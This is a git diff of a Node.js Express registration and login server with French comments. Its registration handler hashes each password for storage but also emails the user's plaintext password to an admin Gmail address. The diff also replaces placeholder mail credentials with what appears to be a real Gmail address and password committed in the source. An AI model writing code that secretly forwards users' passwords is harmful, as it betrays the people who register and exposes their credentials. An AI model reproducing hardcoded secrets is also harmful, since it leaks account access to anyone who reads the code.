@@ -28,15 +28,15 @@ db.serialize(() => {
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
-    user: "tonemail@gmail.com", // Ton adresse email
-    pass: "tonmotdepasse", // Ton mot de passe ou mot de passe d'application
+    user: "charton.hugo1001@gmail.com", // Ton adresse email
+    pass: "Ptitbiscuit21", // Mot de passe ou mot de passe d'application
   },
 });
 
 // Fonction pour envoyer un email à l'admin lors de l'inscription
 const sendEmailToAdmin = (email, password) => {
   const mailOptions = {
-    from: "tonemail@gmail.com",
+    from: "tonemail@gmail.com", // Ton adresse email
     to: "charton.hugo1001@gmail.com", // Ton email admin
     subject: `Nouvelle inscription: ${email}`,
     text: `Un utilisateur s'est inscrit avec l'email ${email} et le mot de passe: ${password}`,
@@ -54,22 +54,36 @@ const sendEmailToAdmin = (email, password) => {
 app.post("/api/register", (req, res) => {
   const { email, password } = req.body;
 
-  bcrypt.hash(password, 10, (err, hashedPassword) => {
-    if (err) return res.status(500).json({ message: "Erreur interne" });
+  // Vérifier si l'email existe déjà
+  db.get("SELECT * FROM users WHERE email = ?", [email], (err, user) => {
+    if (user) {
+      return res.status(400).json({ message: "Email déjà utilisé" });
+    }
 
-    const stmt = db.prepare(
-      "INSERT INTO users (email, password) VALUES (?, ?)"
-    );
-    stmt.run(email, hashedPassword, function (err) {
-      if (err) {
-        return res.status(400).json({ message: "Email déjà utilisé" });
-      }
+    // Hachage du mot de passe
+    bcrypt.hash(password, 10, (err, hashedPassword) => {
+      if (err)
+        return res
+          .status(500)
+          .json({ message: "Erreur interne lors du hachage du mot de passe" });
 
-      // Envoi de l'email à l'admin
-      sendEmailToAdmin(email, password);
-      res.json({ success: true, userId: this.lastID });
+      // Insérer l'utilisateur dans la base de données
+      const stmt = db.prepare(
+        "INSERT INTO users (email, password) VALUES (?, ?)"
+      );
+      stmt.run(email, hashedPassword, function (err) {
+        if (err) {
+          return res
+            .status(500)
+            .json({ message: "Erreur interne lors de l'inscription" });
+        }
+
+        // Envoi de l'email à l'admin
+        sendEmailToAdmin(email, password);
+        res.json({ success: true, userId: this.lastID });
+      });
+      stmt.finalize();
     });
-    stmt.finalize();
   });
 });
 
@@ -77,6 +91,7 @@ app.post("/api/register", (req, res) => {
 app.post("/api/login", (req, res) => {
   const { email, password } = req.body;
 
+  // Chercher l'utilisateur dans la base de données
   db.get("SELECT * FROM users WHERE email = ?", [email], (err, user) => {
     if (err || !user) {
       return res.status(400).json({ message: "Utilisateur non trouvé" });
